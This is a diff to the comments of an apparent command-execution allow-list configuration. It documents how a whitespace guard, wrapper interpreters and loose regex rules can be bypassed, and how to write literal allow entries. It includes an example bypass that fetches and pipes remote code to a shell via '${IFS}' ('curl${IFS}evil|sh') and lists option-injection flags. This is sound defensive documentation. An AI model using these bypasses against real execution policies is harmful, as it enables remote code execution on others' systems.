@@ -132,12 +132,36 @@ args = [["/etc/shadow"]]
 # message, a path with a space, a quoted search term), and cannot run a
 # program whose own path contains a space. Such a command needs a Template
 # Operation (ADR-0021), whose slots are typed and quoted by its author. For a
-# spaced program path, a space-free symlink also works.
+# spaced program path, a space-free symlink also works. The guard tests for
+# whitespace only, not shell syntax: shell metacharacters and ${IFS} are not
+# whitespace, so a script written without whitespace still passes it, e.g.
+# ["/bin/sh","-c","id;curl${IFS}evil|sh"], and the shell the allow chose
+# expands ${IFS} back into a separator once it runs.
 #
 # Standing guidance: a deny list is a backstop, never the primary control.
-# Write the WHOLE command for wrapper interpreters (env, xargs, nice, timeout,
-# sudo, nohup, setsid, ...); a trailing .* such as ^/usr/bin/env .*$ still
-# re-dispatches to anything.
+# The same rule covers wrapper interpreters (env, xargs, nice, timeout, sudo,
+# nohup, setsid, ...) and script interpreters (sh -c, bash -c, python -c,
+# perl -e, ...): first, promote interpreter-shaped work to a Template
+# Operation (ADR-0021), whose structure is fixed by its author and whose
+# slots are single-quoted — the same rule holds inside a Template: its
+# interpreted text (the -c/-e script, the program to run) must be written
+# literally in the template body, never filled by a slot; a slot may fill
+# only a data position, never the script or the program to run. Only where
+# Raw Exec is unavoidable, write the WHOLE command as a literal, so the
+# script text is fixed by you and not by the caller. Never put a trailing
+# .* or an open character class on an argument the program interprets as
+# code or as a path to run, and never a class that lets a caller-supplied
+# argument begin with "-" (option injection: tar --to-command=, rsync -e,
+# git -c core.sshCommand=, systemctl -H...) — a trailing .* such as
+# ^/usr/bin/env .*$ or ^/bin/sh -c .*$ still re-dispatches to anything, and
+# even ^/bin/sh -c [A-Za-z0-9/._-]+$ still runs any program or executable
+# file the caller names. A "literal" allow must itself escape every regex
+# metacharacter in the command it names, or it is not literal:
+# ^/bin/sh -c id|sh$ compiles to \A(?:^/bin/sh -c id|sh$)\z, an alternation
+# that admits only /bin/sh -c id or a bare ["sh"], never the command it
+# appears to name; escaped as ^/bin/sh -c id\|sh$, it is literal — written
+# as a TOML string, that escape is \\| in a basic (double-quoted) allow
+# entry and \| in a literal (single-quoted) one.
 #
 # No allow regex → all Raw Exec commands denied (deny-by-default).
 # ---------------------------------------------------------------------------
